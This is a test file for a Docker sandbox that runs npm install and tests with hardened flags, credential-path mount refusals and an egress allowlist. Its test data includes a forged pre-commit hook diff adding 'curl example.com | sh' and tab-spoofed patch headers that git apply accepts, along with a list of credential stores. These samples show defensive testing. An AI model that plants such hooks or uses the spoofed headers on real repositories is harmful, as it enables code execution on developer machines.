import { execFileSync } from 'node:child_process';
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  DOCKER_CONTAINMENT_DRIVER,
  DOCKER_CONTAINMENT_NODE_IMAGES,
  DOCKER_CONTAINMENT_PROXY_ALIAS,
  assertDockerMountSource,
  buildDockerContainmentRunArgs,
  buildDockerContainmentVolumeInitArgs,
  buildDockerEgressProxyCreateArgs,
  buildEgressAllowlist,
  parseNpmrcRegistryHosts,
  selectApplicablePatch,
  selectDockerContainmentNodeMajor,
} from './dockerContainment.js';

const IMAGE = DOCKER_CONTAINMENT_NODE_IMAGES[24];
const HOME = '/home/example';
const DATA = '/srv/portos/data';
const base = {
  image: IMAGE, containerName: 'portos-contained-r1', runId: 'r1', worktree: '/srv/repos/example-app',
  inputDir: '/tmp/portos-contained-x/in', outputDir: '/tmp/portos-contained-x/out', workVolume: 'portos-contained-work-abc',
  command: 'npm test', user: '1000:1000', dataDir: DATA, realHome: HOME,
};
const flagValues = (args, flag) => args.flatMap((arg, i) => (arg === flag ? [args[i + 1]] : []));

describe('Docker containment run args', () => {
  it('pins the hardening flags, the read-only source and the explicit environment', () => {
    const args = buildDockerContainmentRunArgs({ ...base, phase: 'validate' });
    const options = args.slice(0, args.indexOf(IMAGE));
    expect(options.slice(0, 5)).toEqual(['run', '--rm', '--pull', 'never', '--init']);
    for (const flag of ['--read-only']) expect(options).toContain(flag);
    expect(flagValues(options, '--cap-drop')).toEqual(['ALL']);
    expect(options).not.toContain('--cap-add');
    expect(options).not.toContain('--privileged');
    expect(flagValues(options, '--security-opt')).toEqual(['no-new-privileges']);
    expect(flagValues(options, '--user')).toEqual(['1000:1000']);
    expect(flagValues(options, '--memory')).toEqual(flagValues(options, '--memory-swap'));
    expect(flagValues(options, '--pids-limit')).toEqual(['1024']);
    expect(flagValues(options, '--ulimit')).toEqual(['fsize=2147483648:2147483648', 'core=0:0']);
    expect(flagValues(options, '--label')).toEqual(['org.portos.containment.run=r1']);
    expect(flagValues(options, '--mount')).toEqual([
      'type=bind,source=/srv/repos/example-app,target=/src,readonly',
      'type=bind,source=/tmp/portos-contained-x/in,target=/in,readonly',
      'type=bind,source=/tmp/portos-contained-x/out,target=/out',
      'type=volume,source=portos-contained-work-abc,target=/work,volume-nocopy',
      'type=volume,source=portos-contained-npm-cache,target=/cache,volume-nocopy,readonly',
    ]);
    expect(options).not.toContain('-v');
    expect(options).not.toContain('--volume');
    expect(args.slice(args.indexOf(IMAGE) + 1).slice(-3)).toEqual(['portos-contained', 'validate', 'npm test']);
  });

  it('gives validate no network and install only its internal proxy network', () => {
    const validate = buildDockerContainmentRunArgs({ ...base, phase: 'validate' });
    expect(flagValues(validate, '--network')).toEqual(['none']);
    expect(flagValues(validate, '--env').some((pair) => /proxy/i.test(pair))).toBe(false);
    const install = buildDockerContainmentRunArgs({ ...base, phase: 'install', network: 'portos-contained-net-r1' });
    expect(flagValues(install, '--network')).toEqual(['portos-contained-net-r1']);
    expect(flagValues(install, '--env')).toContain(`HTTPS_PROXY=http://${DOCKER_CONTAINMENT_PROXY_ALIAS}:3128`);
    expect(install).not.toContain('--add-host');
    expect(() => buildDockerContainmentRunArgs({ ...base, phase: 'install' })).toThrow('network');
  });

  it('builds the container environment from nothing — no inherited host variable', () => {
    const marker = 'PORTOS_CONTAINMENT_HOST_ONLY';
    process.env[marker] = 'example-secret';
    try {
      for (const phase of ['install', 'validate']) {
        const args = buildDockerContainmentRunArgs({ ...base, phase, network: 'portos-contained-net-r1' });
        const keys = flagValues(args, '--env').map((pair) => pair.split('=')[0]).sort();
        const expected = ['CI', 'HOME', 'LANG', 'NO_UPDATE_NOTIFIER', 'TMPDIR', 'npm_config_cache', 'npm_config_fund', 'npm_config_logs_dir', 'npm_config_update_notifier',
          ...(phase === 'install'
            ? ['HTTPS_PROXY', 'HTTP_PROXY', 'NODE_USE_ENV_PROXY', 'http_proxy', 'https_proxy', 'npm_config_https_proxy', 'npm_config_proxy']
            : ['npm_config_offline'])].sort();
        expect(keys).toEqual(expected);
        expect(args.join('\n')).not.toContain('example-secret');
        expect(flagValues(args, '--env').every((pair) => pair.includes('='))).toBe(true);
      }
    } finally {
      delete process.env[marker];
    }
  });

  it('refuses a root user and an image not pinned by digest', () => {
    expect(() => buildDockerContainmentRunArgs({ ...base, phase: 'validate', user: '0:0' })).toThrow('non-root');
    expect(() => buildDockerContainmentRunArgs({ ...base, phase: 'validate', image: 'node:24-bookworm-slim' })).toThrow('digest');
  });
});

describe('assertDockerMountSource', () => {
  const guard = (path) => () => assertDockerMountSource(path, { dataDir: DATA, realHome: HOME });

  it.each([
    ['the Docker socket', '/var/run/docker.sock'],
    ['the run directory', '/run'],
    ["Docker Desktop's user socket", `${HOME}/.docker/run/docker.sock`],
    ['a renamed engine socket', '/srv/sockets/containerd.sock'],
    ['the filesystem root', '/'],
    ['the home directory', HOME],
    ['a home ancestor', '/home'],
    ['~/.ssh', `${HOME}/.ssh`],
    ['a key inside ~/.ssh', `${HOME}/.ssh/id_ed25519`],
    ['~/.config/gh', `${HOME}/.config/gh`],
    ['~/.config (contains gh)', `${HOME}/.config`],
    ['~/.npmrc', `${HOME}/.npmrc`],
    ['~/.portos', `${HOME}/.portos`],
    ['~/.claude', `${HOME}/.claude`],
    ['~/.codex', `${HOME}/.codex`],
    ['the data directory', DATA],
    ['a data ancestor', '/srv/portos'],
    ['settings inside data', `${DATA}/settings.json`],
    ['the worktree root itself', `${DATA}/cos/worktrees`],
    ['a path with a comma', '/srv/repos/a,readonly=false'],
    ['a relative path', 'repos/example'],
  ])('refuses %s', (_label, path) => {
    expect(guard(path)).toThrow(/refusing|absolute|cannot mount/);
  });

  it('allows a checkout, a disposable data worktree and a home project', () => {
    expect(guard('/srv/repos/example-app')()).toBe('/srv/repos/example-app');
    expect(guard(`${DATA}/cos/worktrees/claim-example`)()).toBe(`${DATA}/cos/worktrees/claim-example`);
    expect(guard(`${DATA}/autofixer/worktrees/autofixer_example_1`)()).toBe(`${DATA}/autofixer/worktrees/autofixer_example_1`);
    expect(guard(`${HOME}/projects/example-app`)()).toBe(`${HOME}/projects/example-app`);
  });

  it('is applied to every bind mount the run args make', () => {
    expect(() => buildDockerContainmentRunArgs({ ...base, phase: 'validate', worktree: `${HOME}/.ssh` })).toThrow('credential store');
    expect(() => buildDockerContainmentRunArgs({ ...base, phase: 'validate', outputDir: '/var/run' })).toThrow('refusing');
    expect(() => buildDockerContainmentRunArgs({ ...base, phase: 'validate', inputDir: DATA })).toThrow('data directory');
  });
});

describe('helper containers', () => {
  it('runs the volume init as root with only CHOWN, no network and a fixed command', () => {
    const args = buildDockerContainmentVolumeInitArgs({ image: IMAGE, containerName: 'portos-contained-init-r1', runId: 'r1', volumes: ['portos-contained-work-abc'], user: '1000:1000' });
    expect(flagValues(args, '--cap-add')).toEqual(['CHOWN']);
    expect(flagValues(args, '--network')).toEqual(['none']);
    expect(args.slice(args.indexOf(IMAGE) + 1)).toEqual(['1000:1000', '/v0']);
  });

  it('attaches the egress proxy to the run network under the alias, hardened, with the allowlist', () => {
    const args = buildDockerEgressProxyCreateArgs({ image: IMAGE, containerName: 'portos-contained-proxy-r1', runId: 'r1', network: 'portos-contained-net-r1', allowlist: ['registry.npmjs.org', '192.0.2.10'], source: '/* proxy */' });
    expect(flagValues(args, '--network')).toEqual(['portos-contained-net-r1']);
    expect(flagValues(args, '--network-alias')).toEqual([DOCKER_CONTAINMENT_PROXY_ALIAS]);
    expect(flagValues(args, '--cap-drop')).toEqual(['ALL']);
    expect(args).toContain('--read-only');
    expect(flagValues(args, '--env')).toContain('PORTOS_EGRESS_ALLOW=registry.npmjs.org');
    expect(args.some((arg) => arg.startsWith('--mount') || arg === '-v')).toBe(false);
  });
});

describe('selectApplicablePatch', () => {
  it('keeps lockfile sections and withholds everything else the container changed', () => {
    const lock = '--- a/server/package-lock.json\n+++ b/server/package-lock.json\n@@ -1,2 +1,2 @@\n {\n-  "v": 1\n+  "v": 2\n';
    // A deleted line that reads like a file header must not start a forged section.
    const hook = '--- a/.husky/pre-commit\n+++ b/.husky/pre-commit\n@@ -1,2 +1,1 @@\n---- a/yarn.lock\n-npm test\n+curl example.com | sh\n';
    expect(selectApplicablePatch(`${hook}${lock}`)).toEqual({ patch: lock, applied: ['server/package-lock.json'], withheld: ['.husky/pre-commit'] });
    expect(selectApplicablePatch(hook)).toMatchObject({ patch: null, applied: [], withheld: ['.husky/pre-commit'] });
    expect(selectApplicablePatch('--- a/yarn.lock\n+++ b/evil.sh\n')).toMatchObject({ patch: null, malformed: true });
  });

  it.each([
    ['tab-comment spoofing package.json', '--- a/package.json\t/package-lock.json\n+++ b/package.json\t/package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['tab-comment spoofing hook', '--- a/.husky/pre-commit\t/package-lock.json\n+++ b/.husky/pre-commit\t/package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['tab timestamp suffix', '--- a/package-lock.json\t2026-01-01\n+++ b/package-lock.json\t2026-01-01\n@@ -1 +1 @@\n-a\n+b\n'],
    ['space in path', '--- a/package.json /package-lock.json\n+++ b/package.json /package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['carriage return in path', '--- a/package-lock.json\r\n+++ b/package-lock.json\r\n@@ -1 +1 @@\n-a\n+b\n'],
    ['NUL byte in path', '--- a/package.json\0/package-lock.json\n+++ b/package.json\0/package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['escape control character in path', '--- a/package.json\x1b/package-lock.json\n+++ b/package.json\x1b/package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['double quote in path', '--- a/"package-lock.json"\n+++ b/"package-lock.json"\n@@ -1 +1 @@\n-a\n+b\n'],
    ['backslash in path', '--- a/server\\package-lock.json\n+++ b/server\\package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['leading slash', '--- a//package-lock.json\n+++ b//package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['trailing slash', '--- a/package-lock.json/\n+++ b/package-lock.json/\n@@ -1 +1 @@\n-a\n+b\n'],
    ['empty segment', '--- a/server//package-lock.json\n+++ b/server//package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['dot segment', '--- a/./package-lock.json\n+++ b/./package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['nested dot segment', '--- a/server/./package-lock.json\n+++ b/server/./package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['parent traversal segment', '--- a/../yarn.lock\n+++ b/../yarn.lock\n@@ -1 +1 @@\n-a\n+b\n'],
    ['nested parent traversal segment', '--- a/server/../package.json\n+++ b/server/../package.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['git extended header symlink mode', 'diff --git a/package-lock.json b/package-lock.json\nnew file mode 120000\n--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-a\n+b\n'],
    ['git extended header between headers and hunk', '--- a/package-lock.json\n+++ b/package-lock.json\nnew mode 120000\n@@ -1 +1 @@\n-a\n+b\n'],
    ['git extended header after section', '--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-a\n+b\nold mode 100644\nnew mode 120000\n'],
    ['section without hunks', '--- a/package-lock.json\n+++ b/package-lock.json\n'],
    ['truncated hunk', '--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1,2 +1,2 @@\n-a\n+b\n'],
  ])('rejects %s as malformed with null patch', (_label, patch) => {
    expect(selectApplicablePatch(patch)).toEqual({ patch: null, applied: [], withheld: [], malformed: true });
  });

  it('rejects tab-comment spoofing that real git apply would accept while allowing real lockfile patches', () => {
    const repo = mkdtempSync(join(tmpdir(), 'portos-patch-git-'));
    try {
      mkdirSync(join(repo, 'server'), { recursive: true });
      mkdirSync(join(repo, '.husky'), { recursive: true });
      writeFileSync(join(repo, 'package.json'), '{"name":"example","version":"1.0.0"}\n');
      writeFileSync(join(repo, 'package-lock.json'), '{"lockfileVersion":3,"version":"1.0.0"}\n');
      writeFileSync(join(repo, 'server', 'package-lock.json'), '{"lockfileVersion":3,"version":"1.0.0"}\n');
      writeFileSync(join(repo, 'yarn.lock'), '# yarn v1\n');
      writeFileSync(join(repo, '.husky', 'pre-commit'), 'npm test\n');
      execFileSync('git', ['init', '-q'], { cwd: repo });
      execFileSync('git', ['add', '.'], { cwd: repo });

      const forged = [
        '--- a/package.json\t/package-lock.json',
        '+++ b/package.json\t/package-lock.json',
        '@@ -1 +1 @@',
        '-{"name":"example","version":"1.0.0"}',
        '+{"name":"example","scripts":{"test":"echo pwn"}}',
        '',
      ].join('\n');
      const forgedFile = join(repo, 'forged.patch');
      writeFileSync(forgedFile, forged);
      // Confirm the exploit premise: git apply itself accepts the tab-comment spoofed header.
      expect(() => execFileSync('git', ['-C', repo, 'apply', '--check', forgedFile], { stdio: 'pipe' })).not.toThrow();
      expect(selectApplicablePatch(forged)).toEqual({ patch: null, applied: [], withheld: [], malformed: true });

      const legitimate = [
        '--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{"name":"example","version":"1.0.0"}\n+{"name":"example","version":"9.9.9"}\n',
        '--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-{"lockfileVersion":3,"version":"1.0.0"}\n+{"lockfileVersion":3,"version":"1.0.1"}\n',
        '--- a/server/package-lock.json\n+++ b/server/package-lock.json\n@@ -1 +1 @@\n-{"lockfileVersion":3,"version":"1.0.0"}\n+{"lockfileVersion":3,"version":"1.0.2"}\n',
        '--- a/yarn.lock\n+++ b/yarn.lock\n@@ -1 +1 @@\n-# yarn v1\n+# yarn v2\n',
      ].join('');
      const selected = selectApplicablePatch(legitimate);
      expect(selected.malformed).toBeUndefined();
      expect(selected.applied).toEqual(['package-lock.json', 'server/package-lock.json', 'yarn.lock']);
      expect(selected.withheld).toEqual(['package.json']);
      const selectedFile = join(repo, 'selected.patch');
      writeFileSync(selectedFile, selected.patch);
      execFileSync('git', ['-C', repo, 'apply', '--check', selectedFile], { stdio: 'pipe' });
      execFileSync('git', ['-C', repo, 'apply', selectedFile], { stdio: 'pipe' });
      expect(readFileSync(join(repo, 'package.json'), 'utf8')).toBe('{"name":"example","version":"1.0.0"}\n');
      expect(readFileSync(join(repo, 'package-lock.json'), 'utf8')).toBe('{"lockfileVersion":3,"version":"1.0.1"}\n');
      expect(readFileSync(join(repo, 'server', 'package-lock.json'), 'utf8')).toBe('{"lockfileVersion":3,"version":"1.0.2"}\n');
      expect(readFileSync(join(repo, 'yarn.lock'), 'utf8')).toBe('# yarn v2\n');
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });
});

describe('DOCKER_CONTAINMENT_DRIVER patch creation', () => {
  const runDriver = (root, command) => {
    const script = DOCKER_CONTAINMENT_DRIVER.replace(/\/(src|work|in|out)(?![.\w])/g, (_, dir) => join(root, dir));
    return execFileSync('/bin/sh', ['-c', script, 'portos-contained', 'install', command], {
      env: { PATH: process.env.PATH, HOME: join(root, 'tmp', 'home'), TMPDIR: join(root, 'tmp') },
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe'],
    });
  };

  const setupDriverRoot = () => {
    const root = mkdtempSync(join(tmpdir(), 'portos-driver-'));
    for (const dir of ['src', 'work', 'in', 'out', 'tmp']) mkdirSync(join(root, dir), { recursive: true });
    writeFileSync(join(root, 'src', 'package-lock.json'), '{"v":1}\n');
    writeFileSync(join(root, 'in', 'tracked.lst'), 'package-lock.json\n');
    return root;
  };

  it.runIf(process.platform !== 'win32')('removes a pre-existing read-only forged patch file before writing the real diff', () => {
    const root = setupDriverRoot();
    try {
      const outPatch = join(root, 'out', 'changes.patch');
      const cmd = `printf '%s\\n' '--- a/package.json\t/package-lock.json' > '${outPatch}' && chmod 444 '${outPatch}' && printf '%s\\n' '{"v":2}' > package-lock.json`;
      runDriver(root, cmd);
      const written = readFileSync(outPatch, 'utf8');
      expect(written).not.toContain('package.json');
      expect(written).toContain('--- a/package-lock.json');
      expect(written).toContain('+{"v":2}');
    } finally {
      chmodSync(join(root, 'out'), 0o755);
      rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform !== 'win32')('exits 125 when /out/changes.patch cannot be removed or rewritten', () => {
    const root = setupDriverRoot();
    try {
      const outDir = join(root, 'out');
      const outPatch = join(outDir, 'changes.patch');
      const cmd = `printf '%s\\n' '--- a/package.json\t/package-lock.json' > '${outPatch}' && chmod 555 '${outDir}'`;
      let failure = null;
      try {
        runDriver(root, cmd);
      } catch (err) {
        failure = err;
      }
      expect(failure?.status).toBe(125);
      expect(String(failure?.stderr ?? '')).toContain('could not write the patch');
    } finally {
      chmodSync(join(root, 'out'), 0o755);
      rmSync(root, { recursive: true, force: true });
    }
  });
});

describe('repository hints', () => {
  it.each([
    [{ nvmrc: 'v22.11.0\n' }, 22, '.nvmrc', true],
    [{ nodeVersion: '26' }, 26, '.node-version', true],
    [{ enginesNode: '^22.22.2 || ^24.15.0 || >=26.0.0' }, 26, 'engines.node', true],
    [{ enginesNode: '>=18' }, 26, 'engines.node', true],
    [{ enginesNode: '18.x' }, 18, 'engines.node', false],
    [{ nvmrc: 'lts/*' }, 24, '.nvmrc', true],
    [{}, 24, 'default', true],
  ])('selects the Node major from %j', (hints, major, source, supported) => {
    expect(selectDockerContainmentNodeMajor(hints)).toMatchObject({ major, source, supported });
  });

  it('reads registry host names, never auth lines, from .npmrc', () => {
    const npmrc = [
      'registry=https://npm.example.com/',
      '@acme:registry=https://pkgs.example.org/npm/',
      '//npm.example.com/:_authToken=example-token',
      'proxy=http://192.0.2.10:8080',
      'registry=http://insecure.example.net/',
    ].join('\n');
    expect(parseNpmrcRegistryHosts(npmrc)).toEqual(['npm.example.com', 'pkgs.example.org']);
    expect(buildEgressAllowlist({ extraHosts: ['Cdn.Example.com', 'not a host'], npmrcHosts: ['npm.example.com'] }))
      .toEqual(['registry.npmjs.org', 'registry.yarnpkg.com', 'cdn.example.com', 'npm.example.com']);
  });
});
